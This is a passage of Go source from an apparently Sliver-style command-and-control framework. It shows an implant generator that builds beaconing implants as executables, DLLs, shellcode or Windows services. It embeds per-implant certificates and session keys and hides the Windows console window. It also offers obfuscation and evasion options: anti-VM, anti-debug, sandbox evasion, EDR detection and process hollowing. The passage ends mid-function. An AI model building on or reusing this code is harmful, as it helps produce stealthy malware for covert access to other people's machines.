package main

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"go/format"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"text/template"
	"time"

	"silkwire/shared"

	"github.com/sirupsen/logrus"
)

// ImplantConfig represents the configuration for a generated implant
type ImplantConfig struct {
	// Network Configuration
	ServerAddr string
	Port       int
	Transport  string // "HTTPS", "HTTP", "mTLS", "DNS"

	// Authentication
	ListenerID    string
	SessionKey    string
	SkipTLSVerify bool

	// Implant Behavior
	BeaconInterval int32 // seconds
	JitterPercent  int32 // 0-100
	KillDate       *time.Time
	MaxRetries     int32

	// Build Options
	OS        string // "windows", "linux", "darwin"
	Arch      string // "amd64", "386", "arm64"
	Format    string // "exe", "dll", "shellcode", "service"
	Obfuscate bool
	Garble    bool
	Debug     bool

	// Enhanced Obfuscation Options
	ObfuscationLevel       int  // 0=none, 1=light, 2=medium, 3=heavy, 4=extreme
	StringObfuscation      bool // XOR-based string encryption
	NameObfuscation        bool // Function/variable name obfuscation
	ControlFlowObfuscation bool // Junk code and control flow flattening
	APIObfuscation         bool // Dynamic API resolution
	NetworkObfuscation     bool // Network traffic obfuscation
	RuntimePacking         bool // Runtime code encryption
	UPXPacking             bool // UPX compression
	FakeResources          bool // Fake version info and resources

	// Advanced Evasion Options
	ProcessHollowing      bool // Process hollowing detection
	AntiEmulation         bool // Anti-emulation techniques
	SandboxEvasion        bool // Enhanced sandbox detection
	EDRDetection          bool // EDR/AV process detection
	NetworkFingerprinting bool // Network-based detection evasion

	// Optional Features
	EnablePTY   bool
	EnableFiles bool
	EnableProxy bool

	// Basic Evasion (kept for compatibility)
	AntiVM         bool
	AntiDebug      bool
	SleepMask      bool
	PersistentMode bool // Never exit due to evasion checks (for testing/persistence)
}

// ImplantGenerator handles dynamic implant generation
type ImplantGenerator struct {
	templateDir string
	outputDir   string
	caManager   *CAManager
}

// NewImplantGenerator creates a new implant generator
func NewImplantGenerator() *ImplantGenerator {
	// Use an absolute output directory rooted at the executable's parent dir (project root)
	exePath, err := os.Executable()
	var absOut string
	if err == nil {
		exeDir := filepath.Dir(exePath)
		projectRoot := filepath.Dir(exeDir)
		absOut = filepath.Join(projectRoot, "generated")
	} else {
		// Fallback to current working directory
		if wd, werr := os.Getwd(); werr == nil {
			absOut = filepath.Join(wd, "generated")
		} else {
			absOut = "generated"
		}
	}
	return &ImplantGenerator{
		templateDir: resolveSliverImplantDir(),
		outputDir:   absOut,
	}
}

// SetCAManager sets the CA manager for generating per-implant certificates (Sliver-style)
func (ig *ImplantGenerator) SetCAManager(caManager *CAManager) {
	ig.caManager = caManager
}

// GenerateImplant creates a new implant with the specified configuration
func (ig *ImplantGenerator) GenerateImplant(config *ImplantConfig) (string, error) {
	// Generate unique session key if not provided
	if config.SessionKey == "" {
		sessionKey := make([]byte, 32)
		if _, err := rand.Read(sessionKey); err != nil {
			return "", fmt.Errorf("failed to generate session key: %v", err)
		}
		config.SessionKey = hex.EncodeToString(sessionKey)
	}

	// Generate listener ID if not provided
	if config.ListenerID == "" {
		config.ListenerID = "lst_" + shared.GenerateImplantID()
	}

	// Set defaults
	if config.BeaconInterval == 0 {
		config.BeaconInterval = 120
	}
	if config.JitterPercent == 0 {
		config.JitterPercent = 10
	}
	if config.MaxRetries == 0 {
		config.MaxRetries = 1000 // Very high retry count for persistence
	}

	// Generate implant source files by templating the full implant directory
	sourceFiles, err := ig.generateFullSourceFiles(config)
	if err != nil {
		return "", fmt.Errorf("failed to generate source files: %v", err)
	}

	// Generate filename for this implant
	baseFileName := ig.generateFilename(config)

	// Ensure output directory exists
	if err := os.MkdirAll(ig.outputDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create output directory: %v", err)
	}

	// Write all source files
	var mainSourcePath string
	for fileName, content := range sourceFiles {
		sourcePath := filepath.Join(ig.outputDir, fileName)
		if fileName == "main.go" {
			mainSourcePath = sourcePath
		}
		if err := os.WriteFile(sourcePath, content, 0644); err != nil {
			return "", fmt.Errorf("failed to write source file %s: %v", fileName, err)
		}
	}

	// All source files from the implant directory have been copied/templatized

	// Compile implant (or return source for source formats)
	var finalPath string

	// Use enhanced obfuscation if any advanced options are enabled
	if ig.shouldUseEnhancedObfuscation(config) {
		finalPath, err = ig.compileWithEnhancedObfuscation(mainSourcePath, config, baseFileName)
	} else {
		finalPath, err = ig.compileImplant(mainSourcePath, config, baseFileName)
	}

	if err != nil {
		return "", fmt.Errorf("failed to compile implant: %v", err)
	}

	return finalPath, nil
}

// generateFullSourceFiles copies and templates all .go files from the implant directory
func (ig *ImplantGenerator) generateFullSourceFiles(config *ImplantConfig) (map[string][]byte, error) {
	// Generate CA-signed client certificates for this implant (Sliver-style)
	var clientCert, clientKey, caCert string
	if ig.caManager != nil {
		// Create unique implant ID for this build
		implantID := shared.GenerateImplantID()

		// Generate CA-signed certificate for this specific implant
		certPEM, keyPEM, err := ig.caManager.GenerateClientCertificate(implantID)
		if err != nil {
			return nil, fmt.Errorf("failed to generate client certificate: %v", err)
		}

		clientCert = string(certPEM)
		clientKey = string(keyPEM)
		caCert = string(ig.caManager.GetCACertificate())

		logrus.Infof("Generated CA-signed certificate for implant %s", implantID)
	}

	// Template data for substitution
	data := map[string]any{
		"ServerAddr":     config.ServerAddr,
		"Port":           config.Port,
		"Transport":      config.Transport,
		"ListenerID":     config.ListenerID,
		"SessionKey":     config.SessionKey,
		"SkipTLSVerify":  config.SkipTLSVerify,
		"BeaconInterval": config.BeaconInterval,
		"JitterPercent":  config.JitterPercent,
		"KillDate":       config.KillDate,
		"MaxRetries":     config.MaxRetries,
		"OS":             config.OS,
		"Arch":           config.Arch,
		"EnablePTY":      config.EnablePTY,
		"EnableFiles":    config.EnableFiles,
		"EnableProxy":    config.EnableProxy,
		"AntiVM":         config.AntiVM,
		"AntiDebug":      config.AntiDebug,
		"SleepMask":      config.SleepMask,
		"PersistentMode": config.PersistentMode,
		"GeneratedAt":    time.Now().Format(time.RFC3339),
		"Debug":          config.Debug,

		// CA-signed certificates (Sliver-style per-binary certificates)
		"ClientCert": clientCert,
		"ClientKey":  clientKey,
		"CACert":     caCert,

		// Enhanced Obfuscation Options
		"ObfuscationLevel":       config.ObfuscationLevel,
		"StringObfuscation":      config.StringObfuscation,
		"NameObfuscation":        config.NameObfuscation,
		"ControlFlowObfuscation": config.ControlFlowObfuscation,
		"APIObfuscation":         config.APIObfuscation,
		"NetworkObfuscation":     config.NetworkObfuscation,
		"RuntimePacking":         config.RuntimePacking,
		"UPXPacking":             config.UPXPacking,
		"FakeResources":          config.FakeResources,

		// Advanced Evasion Options
		"ProcessHollowing":      config.ProcessHollowing,
		"AntiEmulation":         config.AntiEmulation,
		"SandboxEvasion":        config.SandboxEvasion,
		"EDRDetection":          config.EDRDetection,
		"NetworkFingerprinting": config.NetworkFingerprinting,
	}

	entries, err := os.ReadDir(ig.templateDir)
	if err != nil {
		return nil, fmt.Errorf("failed to read implant dir: %v", err)
	}

	sourceFiles := make(map[string][]byte)
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if !strings.HasSuffix(name, ".go") || strings.HasSuffix(name, "_test.go") || name == "go.mod" || name == "go.sum" {
			continue
		}
		fullPath := filepath.Join(ig.templateDir, name)
		contents, rerr := os.ReadFile(fullPath)
		if rerr != nil {
			return nil, fmt.Errorf("failed to read %s: %v", name, rerr)
		}

		// If file contains template placeholders, execute template
		var out []byte
		if strings.Contains(string(contents), "{{") {
			tmpl, perr := template.New(name).Parse(string(contents))
			if perr != nil {
				return nil, fmt.Errorf("failed to parse template %s: %v", name, perr)
			}
			var buf bytes.Buffer
			if exErr := tmpl.Execute(&buf, data); exErr != nil {
				return nil, fmt.Errorf("failed to execute template %s: %v", name, exErr)
			}
			out = buf.Bytes()
		} else {
			out = contents
		}

		// Rewrite imports from incorrect c2pb subpackage back to correct proto package
		out = bytes.ReplaceAll(out, []byte("\"silkwire/proto/c2pb\""), []byte("\"silkwire/proto\""))

		// Format Go source code for readability
		formatted, ferr := format.Source(out)
		if ferr != nil {
			return nil, fmt.Errorf("failed to format source %s: %v", name, ferr)
		}
		sourceFiles[name] = formatted
	}
	return sourceFiles, nil
}

// resolveSliverImplantDir finds the Sliver-style implant directory
func resolveSliverImplantDir() string {
	// Prefer standard implant directory that contains a go.mod and main.go
	candidates := []string{
		"implant",
		"./implant",
		"../implant",
	}
	for _, candidate := range candidates {
		if _, err := os.Stat(filepath.Join(candidate, "go.mod")); err == nil {
			if _, err := os.Stat(filepath.Join(candidate, "main.go")); err == nil {
				return candidate
			}
		}
	}
	// Fallback: try to locate any directory with main.go
	for _, candidate := range candidates {
		if _, err := os.Stat(filepath.Join(candidate, "main.go")); err == nil {
			return candidate
		}
	}
	// Final fallback to previous search
	return resolveTemplateDir()
}

// resolveTemplateDir attempts to find the absolute path to the `implant` directory
// regardless of the server process' current working directory.
func resolveTemplateDir() string {
	// Collect candidate base directories to search under for `implant/`.
	var baseDirs []string

	// 1) Current working directory
	if wd, err := os.Getwd(); err == nil {
		baseDirs = append(baseDirs, wd)

		// Also try a few parents of the working directory
		parent := wd
		for i := 0; i < 3; i++ {
			parent = filepath.Dir(parent)
			baseDirs = append(baseDirs, parent)
		}
	}

	// 2) Executable directory and its parent (covers running from built binary)
	if exePath, err := os.Executable(); err == nil {
		exeDir := filepath.Dir(exePath)
		baseDirs = append(baseDirs, exeDir, filepath.Dir(exeDir))
	}

	// Deduplicate while preserving order
	seen := make(map[string]struct{}, len(baseDirs))
	var uniqueBases []string
	for _, b := range baseDirs {
		if b == "" {
			continue
		}
		if _, ok := seen[b]; ok {
			continue
		}
		seen[b] = struct{}{}
		uniqueBases = append(uniqueBases, b)
	}

	// Look for a directory containing the expected template files
	for _, base := range uniqueBases {
		candidate := filepath.Join(base, "implant")
		if _, err := os.Stat(filepath.Join(candidate, "templates", "main.go")); err == nil {
			return candidate
		}
		// Also check for legacy template file
		if _, err := os.Stat(filepath.Join(candidate, "implant.template")); err == nil {
			return candidate
		}
	}

	// Fallback to the original relative path; errors will surface on read
	return "implant"
}

// generateFilename creates a unique filename for the implant using codename-style naming
func (ig *ImplantGenerator) generateFilename(config *ImplantConfig) string {
	// Generate a unique codename for this implant binary
	codename := shared.GenerateCodename()

	// Create filename with codename and platform info
	return fmt.Sprintf("%s_%s_%s", strings.ToLower(codename), config.OS, config.Arch)
}

// compileImplant compiles the generated source code into a binary
func (ig *ImplantGenerator) compileImplant(sourcePath string, config *ImplantConfig, baseFileName string) (string, error) {
	// For source formats, just return the source path
	if config.Format == "source" || config.Format == "go" {
		return sourcePath, nil
	}

	// Generate output path using the baseFileName
	ext := ig.getExecutableExtension(config.OS)
	binaryName := baseFileName + ext
	binaryPath := filepath.Join(ig.outputDir, binaryName)

	// Copy necessary dependencies for standalone compilation
	if err := ig.copyImplantDependencies(); err != nil {
		return "", fmt.Errorf("failed to copy dependencies: %v", err)
	}

	// Ensure module dependencies are downloaded and go.sum is populated
	// Some environments set GOFLAGS=-mod=readonly, so explicitly clear GOFLAGS
	modDownload := exec.Command("go", "mod", "download", "all")
	modDownload.Dir = ig.outputDir
	modDownload.Env = append(os.Environ(), "GOFLAGS=")
	if output, err := modDownload.CombinedOutput(); err != nil {
		return "", fmt.Errorf("failed to download modules: %v\nOutput: %s", err, string(output))
	}

	// Run go mod tidy to update go.mod/go.sum for any newly imported packages in generated sources
	modTidy := exec.Command("go", "mod", "tidy")
	modTidy.Dir = ig.outputDir
	modTidy.Env = append(os.Environ(), "GOFLAGS=")
	if output, err := modTidy.CombinedOutput(); err != nil {
		return "", fmt.Errorf("failed to tidy modules: %v\nOutput: %s", err, string(output))
	}

	// Prepare build command
	var cmd *exec.Cmd
	if config.Garble {
		// Find garble executable - use absolute path for reliability
		var garblePath string
		if _, err := exec.LookPath("garble"); err == nil {
			garblePath = "garble" // Found in PATH
		} else {
			// Try GOPATH/bin/garble using go env
			if goEnvCmd := exec.Command("go", "env", "GOPATH"); goEnvCmd != nil {
				if gopathBytes, err := goEnvCmd.Output(); err == nil {
					gopath := strings.TrimSpace(string(gopathBytes))
					if gopath != "" {
						goBin := filepath.Join(gopath, "bin", "garble")
						if _, err := os.Stat(goBin); err == nil {
							garblePath = goBin
						}
					}
				}
			}
		}

		if garblePath == "" {
			return "", fmt.Errorf("garble not found in PATH or GOPATH/bin. Install it with: make tools")
		}

		// Use garble for code obfuscation
		args := []string{"build"}
		// Force static compilation with rebuild of all packages
		args = append(args, "-a")
		// Build ldflags based on configuration
		ldflags := ""
		if config.Obfuscate {
			ldflags = "-s -w"
		}
		// Add Windows GUI subsystem flag to hide console window (unless debug mode)
		if config.OS == "windows" && !config.Debug {
			if ldflags != "" {
				ldflags += " "
			}
			ldflags += "-H windowsgui"
		}
		// Add static linking for non-Windows
		if config.OS != "windows" {
			if ldflags != "" {
				ldflags += " "
			}
			ldflags += "-extldflags=-static"
		}
		if ldflags != "" {
			args = append(args, "-ldflags", ldflags)
		}
		args = append(args, "-o", binaryPath)
		args = append(args, ".")
		cmd = exec.Command(garblePath, args...)
	} else {
		// Use regular go build
		args := []string{"build"}
		// Force static compilation with rebuild of all packages
		args = append(args, "-a")
		// Build ldflags based on configuration
		ldflags := ""
		if config.Obfuscate {
			ldflags = "-s -w"
		}
		// Add Windows GUI subsystem flag to hide console window (unless debug mode)
		if config.OS == "windows" && !config.Debug {
			if ldflags != "" {
				ldflags += " "
			}
			ldflags += "-H windowsgui"
		}
		// Add static linking for non-Windows
		if config.OS != "windows" {
			if ldflags != "" {
				ldflags += " "
			}
			ldflags += "-extldflags=-static"
		}
		if ldflags != "" {
			args = append(args, "-ldflags", ldflags)
		}
		args = append(args, "-o", binaryPath)
		args = append(args, ".")
		cmd = exec.Command("go", args...)
	}

	// Set environment variables for cross-compilation
	cmd.Dir = ig.outputDir // Run build from output directory
	cmd.Env = os.Environ()

	// Add GOPATH/bin to PATH for garble and other Go tools
	if goEnvCmd := exec.Command("go", "env", "GOPATH"); goEnvCmd != nil {
		if gopathBytes, err := goEnvCmd.Output(); err == nil {
			gopath := strings.TrimSpace(string(gopathBytes))
			if gopath != "" {
				goBin := filepath.Join(gopath, "bin")
				// Update PATH environment variable to include GOPATH/bin
				var pathUpdated bool
				for i, env := range cmd.Env {
					if strings.HasPrefix(env, "PATH=") {
						currentPath := env[5:] // Remove "PATH="
						newPath := goBin + string(os.PathListSeparator) + currentPath
						cmd.Env[i] = "PATH=" + newPath
						pathUpdated = true
						break
					}
				}
				// If PATH wasn't found in environment, add it
				if !pathUpdated {
					cmd.Env = append(cmd.Env, "PATH="+goBin)
				}
			}
		}
	}

	cmd.Env = append(cmd.Env, fmt.Sprintf("GOOS=%s", config.OS))
	cmd.Env = append(cmd.Env, fmt.Sprintf("GOARCH=%s", config.Arch))
	// Set GOARM for 32-bit ARM builds (ARMv7)
	if config.Arch == "arm" {
		cmd.Env = append(cmd.Env, "GOARM=7")
	}
	// Clear GOFLAGS to avoid -mod=readonly interfering with dependency resolution
	cmd.Env = append(cmd.Env, "GOFLAGS=")

	// Force static compilation for all platforms to avoid glibc dependencies
	cmd.Env = append(cmd.Env, "CGO_ENABLED=0")

	// If using garble, verify it's available (this was already checked during command creation)
	// No additional verification needed since we resolved the path above

	// Execute build
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("build failed: %v\nOutput: %s", err, string(output))
	}

	// Post-process binary based on format (skip post-processing for source/go formats)
	if config.Format == "source" || config.Format == "go" {
		return binaryPath, nil
	}

	finalPath, err := ig.postProcessBinary(binaryPath, config)
	if err != nil {
		return "", fmt.Errorf("post-processing failed: %v", err)
	}

	return finalPath, nil
}

// getExecutableExtension returns the appropriate file extension for the target OS
func (ig *ImplantGenerator) getExecutableExtension(os string) string {
	switch os {
	case "windows":
		return ".exe"
	default:
		return ""
	}
}

// postProcessBinary applies format-specific transformations to the compiled binary
func (ig *ImplantGenerator) postProcessBinary(binaryPath string, config *ImplantConfig) (string, error) {
	switch config.Format {
	case "exe", "", "binary":
		// No additional processing needed for standard executable
		return binaryPath, nil

	case "source", "go":
		// Source code was already generated, return as-is
		return binaryPath, nil

	case "shellcode":
		// Convert to shellcode using sRDI or similar
		return ig.convertToShellcode(binaryPath, config)

	case "dll":
		// Convert to shared library (DLL/SO cross-compilation supported)
		return ig.convertToSharedLibrary(binaryPath, config)

	case "service":
		// Package as Windows service
		if config.OS != "windows" {
			return "", fmt.Errorf("service format only supported on Windows")
		}
		return ig.packageAsService(binaryPath, config)

	default:
		return "", fmt.Errorf("unsupported format: %s", config.Format)
	}
}

// convertToShellcode converts the binary to position-independent shellcode
func (ig *ImplantGenerator) convertToShellcode(binaryPath string, _ *ImplantConfig) (string, error) {
	// This would typically use tools like sRDI for Windows DLL-to-shellcode conversion
	// For now, return a placeholder implementation
	shellcodePath := strings.TrimSuffix(binaryPath, filepath.Ext(binaryPath)) + ".bin"

	// Copy binary as-is for now (would need actual shellcode conversion)
	data, err := os.ReadFile(binaryPath)
	if err != nil {
		return "", err
	}

	if err := os.WriteFile(shellcodePath, data, 0644); err != nil {
		return "", err
	}

	return shellcodePath, nil
}

// convertToSharedLibrary converts the binary to a shared library (DLL for Windows, SO for Linux/Darwin)
func (ig *ImplantGenerator) convertToSharedLibrary(binaryPath string, config *ImplantConfig) (string, error) {
	// Choose appropriate extension based on target OS
	var ext string
	switch config.OS {
	case "windows":
		ext = ".dll"
	case "linux", "darwin":
		ext = ".so"
	default:
		ext = ".so" // Default to .so for other Unix-like systems
	}

	sharedLibPath := strings.TrimSuffix(binaryPath, filepath.Ext(binaryPath)) + ext

	// Determine if CGO will be enabled for this build
	var cgoEnabled bool
	var crossCompiler string

	// Configure CGO and cross-compilation toolchain
	if config.OS == "windows" {
		// For Windows targets, we need a proper cross-compiler
		if config.Arch == "amd64" {
			crossCompiler = "x86_64-w64-mingw32-gcc"
		} else if config.Arch == "386" {
			crossCompiler = "i686-w64-mingw32-gcc"
		}
		if crossCompiler != "" {
			if _, err := exec.LookPath(crossCompiler); err == nil {
				cgoEnabled = true
			}
		}
	} else {
		// For native builds or when proper cross-compiler is available
		runtimeGOOS := os.Getenv("GOOS")
		if runtimeGOOS == "" {
			if goEnvCmd := exec.Command("go", "env", "GOOS"); goEnvCmd != nil {
				if goosBytes, err := goEnvCmd.Output(); err == nil {
					runtimeGOOS = strings.TrimSpace(string(goosBytes))
				}
			}
		}

		// Only enable CGO if we're building for the same OS or have cross-compilation tools
		if config.OS == runtimeGOOS {
			cgoEnabled = true
		} else {
			// For cross-compilation to different Unix-like systems, try to detect cross-compiler
			switch config.OS {
			case "linux":
				if config.Arch == "amd64" {
					crossCompiler = "x86_64-linux-gnu-gcc"
				} else if config.Arch == "386" {
					crossCompiler = "i686-linux-gnu-gcc"
				} else if config.Arch == "arm64" {
					crossCompiler = "aarch64-linux-gnu-gcc"
				}
			case "darwin":
				// Darwin cross-compilation is complex, disable CGO for now
				cgoEnabled = false
			}

			if crossCompiler != "" {
				if _, err := exec.LookPath(crossCompiler); err == nil {
					cgoEnabled = true
				}
			}
		}
	}

	// If CGO is not available, fallback to regular binary compilation
	if !cgoEnabled {
		// Copy the original binary and rename it with shared library extension
		data, err := os.ReadFile(binaryPath)
		if err != nil {
			return "", fmt.Errorf("failed to read binary for fallback: %v", err)
		}

		if err := os.WriteFile(sharedLibPath, data, 0755); err != nil {
			return "", fmt.Errorf("failed to create fallback shared library: %v", err)
		}

		return sharedLibPath, nil
	}

	// Rebuild as shared library using cross-compilation
	var cmd *exec.Cmd
	if config.Garble {
		// Find garble executable
		var garblePath string
		if _, err := exec.LookPath("garble"); err == nil {
			garblePath = "garble"
		} else {
			// Try GOPATH/bin/garble
			if goEnvCmd := exec.Command("go", "env", "GOPATH"); goEnvCmd != nil {
				if gopathBytes, err := goEnvCmd.Output(); err == nil {
					gopath := strings.TrimSpace(string(gopathBytes))
					if gopath != "" {
						goBin := filepath.Join(gopath, "bin", "garble")
						if _, err := os.Stat(goBin); err == nil {
							garblePath = goBin
						}
					}
				}
			}
		}

		if garblePath == "" {
			return "", fmt.Errorf("garble not found in PATH or GOPATH/bin")
		}

	args := []string{"build", "-buildmode=c-shared"}
	ldflags := ""
	if config.Obfuscate {
		ldflags = "-s -w"
	}
	// Add Windows GUI subsystem flag to hide console window
	if config.OS == "windows" {
		if ldflags != "" {
			ldflags += " "
		}
		ldflags += "-H windowsgui"
	}
	if ldflags != "" {
		args = append(args, "-ldflags", ldflags)
	}
	args = append(args, "-o", sharedLibPath, ".")
	cmd = exec.Command(garblePath, args...)
} else {
	args := []string{"build", "-buildmode=c-shared"}
	ldflags := ""
	if config.Obfuscate {
		ldflags = "-s -w"
	}
	// Add Windows GUI subsystem flag to hide console window
	if config.OS == "windows" {
		if ldflags != "" {
			ldflags += " "
		}
		ldflags += "-H windowsgui"
	}
	if ldflags != "" {
		args = append(args, "-ldflags", ldflags)
	}
	args = append(args, "-o", sharedLibPath, ".")
	cmd = exec.Command("go", args...)
}	// Set environment for cross-compilation
	cmd.Dir = ig.outputDir
	cmd.Env = os.Environ()

	// Add GOPATH/bin to PATH
	if goEnvCmd := exec.Command("go", "env", "GOPATH"); goEnvCmd != nil {
		if gopathBytes, err := goEnvCmd.Output(); err == nil {
			gopath := strings.TrimSpace(string(gopathBytes))
			if gopath != "" {
				goBin := filepath.Join(gopath, "bin")
				var pathUpdated bool
				for i, env := range cmd.Env {
					if strings.HasPrefix(env, "PATH=") {
						currentPath := env[5:]
						newPath := goBin + string(os.PathListSeparator) + currentPath
						cmd.Env[i] = "PATH=" + newPath
						pathUpdated = true
						break
					}
				}
				if !pathUpdated {
					cmd.Env = append(cmd.Env, "PATH="+goBin)
				}
			}
		}
	}

	// Set target OS and architecture
	cmd.Env = append(cmd.Env, fmt.Sprintf("GOOS=%s", config.OS))
	cmd.Env = append(cmd.Env, fmt.Sprintf("GOARCH=%s", config.Arch))
	cmd.Env = append(cmd.Env, "CGO_ENABLED=1")
	cmd.Env = append(cmd.Env, "GOFLAGS=")

	// Set cross-compiler if needed
	if crossCompiler != "" {
		cmd.Env = append(cmd.Env, "CC="+crossCompiler)
	}

	// Execute shared library build
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("shared library build failed: %v\nOutput: %s", err, string(output))
	}

	return sharedLibPath, nil
}

// packageAsService packages the binary as a Windows service
func (ig *ImplantGenerator) packageAsService(binaryPath string, _ *ImplantConfig) (string, error) {
	servicePath := strings.TrimSuffix(binaryPath, filepath.Ext(binaryPath)) + "_service.exe"

	// Placeholder implementation
	data, err := os.ReadFile(binaryPath)
	if err != nil {
		return "", err
	}

	if err := os.WriteFile(servicePath, data, 0644); err != nil {
		return "", err
	}

	return servicePath, nil
}

// ListGeneratedImplants returns information about previously generated implants
func (ig *ImplantGenerator) ListGeneratedImplants() ([]string, error) {
	entries, err := os.ReadDir(ig.outputDir)
	if err != nil {
		if os.IsNotExist(err) {
			return []string{}, nil
		}
		return nil, err
	}

	var implants []string
	for _, entry := range entries {
		if !entry.IsDir() && (strings.HasPrefix(entry.Name(), "implant_") ||
			strings.HasSuffix(entry.Name(), ".exe") ||
			strings.HasSuffix(entry.Name(), ".dll") ||
			strings.HasSuffix(entry.Name(), ".so") ||
			strings.HasSuffix(entry.Name(), ".bin")) {
			implants = append(implants, entry.Name())
		}
	}

	return implants, nil
}

// CleanupGenerated removes old generated implants
func (ig *ImplantGenerator) CleanupGenerated(maxAge time.Duration) error {
	entries, err := os.ReadDir(ig.outputDir)
	if err != nil {
		return err
	}

	cutoff := time.Now().Add(-maxAge)
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		info, err := entry.Info()
		if err != nil {
			continue
		}

		if info.ModTime().Before(cutoff) {
			path := filepath.Join(ig.outputDir, entry.Name())
			if err := os.Remove(path); err != nil {
				return fmt.Errorf("failed to remove %s: %v", path, err)
			}
		}
	}

	return nil
}

// copyImplantDependencies copies proto files, shared modules, and go.mod for standalone compilation
func (ig *ImplantGenerator) copyImplantDependencies() error {
	// Copy go.mod from Sliver implant directory
	goModSource := filepath.Join(ig.templateDir, "go.mod")
	goModDest := filepath.Join(ig.outputDir, "go.mod")

	if data, err := os.ReadFile(goModSource); err == nil {
		if err := os.WriteFile(goModDest, data, 0644); err != nil {
			return fmt.Errorf("failed to copy go.mod: %v", err)
		}
	}

	// Copy go.sum if it exists in the main project
	projectRoot := ig.getProjectRoot()
	if data, err := os.ReadFile(filepath.Join(projectRoot, "go.sum")); err == nil {
		goSumDest := filepath.Join(ig.outputDir, "go.sum")
		if err := os.WriteFile(goSumDest, data, 0644); err != nil {
			return fmt.Errorf("failed to copy go.sum: %v", err)
		}
	}

	// Copy proto directory
	protoDest := filepath.Join(ig.outputDir, "proto")
	if err := os.MkdirAll(protoDest, 0755); err != nil {
		return fmt.Errorf("failed to create proto directory: %v", err)
	}

	// Ensure proto has its own go.mod for local module replacement
	protoGoModPath := filepath.Join(protoDest, "go.mod")
	if _, err := os.Stat(protoGoModPath); os.IsNotExist(err) {
		protoGoMod := []byte("module silkwire/proto\n\n" + "go 1.24.4\n")
		if werr := os.WriteFile(protoGoModPath, protoGoMod, 0644); werr != nil {
			return fmt.Errorf("failed to write proto go.mod: %v", werr)
		}
	}

	// Copy proto files from project root
	protoFiles := []string{"proto/c2.pb.go", "proto/c2_grpc.pb.go"}
	for _, file := range protoFiles {
		fullPath := filepath.Join(projectRoot, file)
		data, err := os.ReadFile(fullPath)
		if err != nil {
			return fmt.Errorf("failed to read %s: %v", file, err)
		}
		// Keep package name as c2pb (no changes needed)
		destFile := filepath.Join(ig.outputDir, file)
		// Ensure directory exists
		if err := os.MkdirAll(filepath.Dir(destFile), 0755); err != nil {
			return fmt.Errorf("failed to create proto directory: %v", err)
		}
		if err := os.WriteFile(destFile, data, 0644); err != nil {
			return fmt.Errorf("failed to copy %s: %v", file, err)
		}
	}

	// Copy shared directory
	sharedDest := filepath.Join(ig.outputDir, "shared")
	if err := os.MkdirAll(sharedDest, 0755); err != nil {
		return fmt.Errorf("failed to create shared directory: %v", err)
	}

	// Ensure shared has its own go.mod for local module replacement
	sharedGoModPath := filepath.Join(sharedDest, "go.mod")
	if _, err := os.Stat(sharedGoModPath); os.IsNotExist(err) {
		sharedGoMod := []byte("module silkwire/shared\n\n" + "go 1.24.4\n")
		if werr := os.WriteFile(sharedGoModPath, sharedGoMod, 0644); werr != nil {
			return fmt.Errorf("failed to write shared go.mod: %v", werr)
		}
	}

	// Copy shared files
	sharedFiles := []string{"shared/utils.go", "shared/types.go"}
	for _, file := range sharedFiles {
		fullPath := filepath.Join(projectRoot, file)
		data, err := os.ReadFile(fullPath)
		if err != nil {
			return fmt.Errorf("failed to read %s: %v", file, err)
		}
		// Keep package name as shared (no changes needed)
		destFile := filepath.Join(ig.outputDir, file)
		if err := os.WriteFile(destFile, data, 0644); err != nil {
			return fmt.Errorf("failed to copy %s: %v", file, err)
		}
	}

	return nil
}

// getProjectRoot returns the absolute path to the project root directory
func (ig *ImplantGenerator) getProjectRoot() string {
	// Try to find the project root by looking for key files
	candidates := []string{
		".", "..", "../..", "../../..",
	}

	// Also try using executable path
	if exePath, err := os.Executable(); err == nil {
		exeDir := filepath.Dir(exePath)
		candidates = append(candidates, exeDir, filepath.Dir(exeDir))
	}

	// Add current working directory and its parents
	if wd, err := os.Getwd(); err == nil {
		candidates = append(candidates, wd)
		parent := wd
		for i := 0; i < 3; i++ {
			parent = filepath.Dir(parent)
			candidates = append(candidates, parent)
		}
	}

	for _, candidate := range candidates {
		// Check for key project files that indicate we're in the project root
		keyFiles := []string{"go.mod", "proto/c2.proto", "shared/utils.go"}
		allExist := true
		for _, keyFile := range keyFiles {
			if _, err := os.Stat(filepath.Join(candidate, keyFile)); os.IsNotExist(err) {
				allExist = false
				break
			}
		}
		if allExist {
			absPath, _ := filepath.Abs(candidate)
			return absPath
		}
	}

	// Fallback to current working directory
	if wd, err := os.Getwd(); err == nil {
		return wd
	}
	return "."
}

// shouldUseEnhancedObfuscation determines if enhanced obfuscation should be used
func (ig *ImplantGenerator) shouldUseEnhancedObfuscation(config *ImplantConfig) bool {
	return config.ObfuscationLevel > 0 ||
		config.StringObfuscation ||
		config.NameObfuscation ||
		config.ControlFlowObfuscation ||
		config.APIObfuscation ||
		config.NetworkObfuscation ||
		config.RuntimePacking ||
		config.ProcessHollowing ||
		config.AntiEmulation ||
		config.SandboxEvasion ||
		config.EDRDetection ||
		config.NetworkFingerprinting
}

// compileWithEnhancedObfuscation uses the comprehensive obfuscation build script
func (ig *ImplantGenerator) compileWithEnhancedObfuscation(sourcePath string, config *ImplantConfig, baseFileName string) (string, error) {
	// For source formats, just return the source path
	if config.Format == "source" || config.Format == "go" {
		return sourcePath, nil
	}

	// Copy the obfuscation build script to the output directory
	projectRoot := ig.getProjectRoot()
	buildScriptSource := filepath.Join(projectRoot, "build_obfuscated.sh")
	buildScriptDest := filepath.Join(ig.outputDir, "build_obfuscated.sh")

	// Check if build script exists
	if _, err := os.Stat(buildScriptSource); os.IsNotExist(err) {
		return "", fmt.Errorf("enhanced obfuscation script not found at %s", buildScriptSource)
	}

	// Copy build script
	scriptData, err := os.ReadFile(buildScriptSource)
	if err != nil {
		return "", fmt.Errorf("failed to read build script: %v", err)
	}

	if err := os.WriteFile(buildScriptDest, scriptData, 0755); err != nil {
		return "", fmt.Errorf("failed to copy build script: %v", err)
	}

	// Determine obfuscation level
	obfLevel := config.ObfuscationLevel
	if obfLevel == 0 {
		// Auto-determine level based on enabled features
		if config.RuntimePacking || config.ProcessHollowing || config.AntiEmulation {
			obfLevel = 4 // Extreme
